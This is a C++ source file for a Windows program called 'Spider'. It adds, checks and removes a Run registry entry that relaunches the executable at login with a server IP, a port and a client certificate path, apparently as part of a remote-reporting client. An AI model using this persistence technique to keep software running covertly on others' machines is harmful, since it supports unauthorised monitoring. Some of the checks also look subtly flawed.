#include <Windows.h>
#include <iostream>
#include "Startup.hh"

Startup::Startup()
{
	HMODULE		hModule = GetModuleHandle(NULL);

	_wappPath = std::wstring();

	if (hModule)
	{
		WCHAR	path[MAX_PATH];

		GetModuleFileName(hModule, path, MAX_PATH);
		_wappPath = std::wstring(L"\"") + path + std::wstring(L"\"");
	}
}

Startup::~Startup()
{

}

int			Startup::isStartup() const
{
	WCHAR	tmp[MAX_PATH];
	DWORD	size = MAX_PATH;

	if ((RegGetValue(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"Spider", RRF_RT_ANY, NULL, (LPVOID)tmp, &size) != ERROR_SUCCESS
		&& _wappPath.compare(tmp) == -1) && (RegGetValue(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"Spider", RRF_RT_ANY, NULL, (LPVOID)tmp, &size) != ERROR_SUCCESS
			&& _wappPath.compare(tmp) == -1)) {
		return(0);
	}
	return (1);
}

void		Startup::addStartup(const std::string& ip, const std::string& port)
{
	HKEY	hkey;

	if (!_wappPath.length() || isStartup()) {
		return ;
	}

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey)
		&& RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey)) {
		std::cerr << "Can't open Key" << std::endl;
		return;
	}

	RegDeleteValue(hkey, L"Spider");

	std::wstring fullCommand(_wappPath);
	std::wstring tmp;
	tmp += L" ";
	tmp.append(ip.begin(), ip.end());
	tmp += L" ";
	tmp.append(port.begin(), port.end());

	try {
		HMODULE hModule = GetModuleHandleW(NULL);
		WCHAR path[MAX_PATH];
		GetModuleFileNameW(hModule, path, MAX_PATH);
		std::wstring wpath(path);
		std::string spath;

		spath.append(wpath.begin(), wpath.end());
		spath = spath.substr(0, spath.find_last_of("\\") + 1);
		spath.append("client.crt");
		std::cout << spath.c_str() << std::endl;
		tmp += L" ";
		tmp.append(spath.begin(), spath.end());
	}
	catch (std::exception& e) { (void)e; }

	fullCommand.append(tmp);

	if (RegSetValueEx(hkey, L"Spider", 0, REG_SZ, (LPBYTE)fullCommand.data(), fullCommand.size() * sizeof(WCHAR) + 1)) {
		std::cerr << "Can't set Key";
	}
}

void		Startup::delStartup()
{
	HKEY	hkey;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey)
		&& RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hkey)) {
		std::cerr << "Can't open Key" << std::endl;
		return;
	}

	RegDeleteValue(hkey, L"Spider");
}
